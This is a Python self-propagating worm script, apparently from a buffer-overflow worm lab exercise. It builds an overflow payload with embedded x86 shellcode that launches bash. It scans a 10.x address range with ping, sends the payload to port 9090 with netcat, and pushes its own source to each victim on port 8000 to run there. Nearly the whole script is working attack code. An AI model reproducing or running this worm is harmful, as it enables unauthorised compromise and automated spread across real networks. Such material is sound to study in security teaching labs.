#!/bin/env python3
import sys
import os
import time
import subprocess
from random import randint

shellcode= (
    "\xeb\x2c\x59\x31\xc0\x88\x41\x19\x88\x41\x1c\x31\xd2\xb2\xd0\x88"
    "\x04\x11\x8d\x59\x10\x89\x19\x8d\x41\x1a\x89\x41\x04\x8d\x41\x1d"
    "\x89\x41\x08\x31\xc0\x89\x41\x0c\x31\xd2\xb0\x0b\xcd\x80\xe8\xcf"
    "\xff\xff\xff"
    "AAAABBBBCCCCDDDD" 
    "/bin/bash*"
    "-c*"
    " echo wormed ; if ! [[ -e worm.py ]];then                   "
    " nc -lnv 8000 > worm.py; python3 worm.py;                   "
    " fi                                                         "
    "123456789012345678901234567890123456789012345678901234567890"
).encode('latin-1')


def createBadfile():
    content = bytearray(0x90 for i in range(500))
    ##################################################################
    # Put the shellcode at the end
    content[500-len(shellcode):] = shellcode
 
    ret    = 0xffffd5f8 + 4 + 40  # Need to change
    offset = 0xffffd5f8 - 0xffffd588 + 4  # Need to change
 
    content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
    ##################################################################
 
    # Save the binary code to file
    with open('badfile', 'wb') as f:
        f.write(content)


def getNextTarget():
    target = ''
    while True:
        target = '10.' + str(randint(151, 155)) + '.0.' + str(randint(70, 80))
        output = subprocess.check_output(f"ping -q -c1 -W1 {target}", shell=True)
        result = output.find(b'1 received')
        if result != -1:
            break
    return target

if len(sys.argv) > 1:
    print('at host computer')
else:
    print("The worm has arrived on this host ^_^", flush=True)
    subprocess.Popen(["ping -q -i2 1.2.3.4"], shell=True)

createBadfile()

while True:
    targetIP = getNextTarget()

   
    print(f"**********************************", flush=True)
    print(f">>>>> Attacking {targetIP} <<<<<", flush=True)
    print(f"**********************************", flush=True)
    subprocess.run([f"cat badfile | nc -w3 {targetIP} 9090"], shell=True)

    time.sleep(1)
    subprocess.run([f"cat worm.py | nc -w5 {targetIP} 8000"], shell=True)
    
    if len(sys.argv) > 1:
        break
   
    time.sleep(10) 
  
    # exit(0)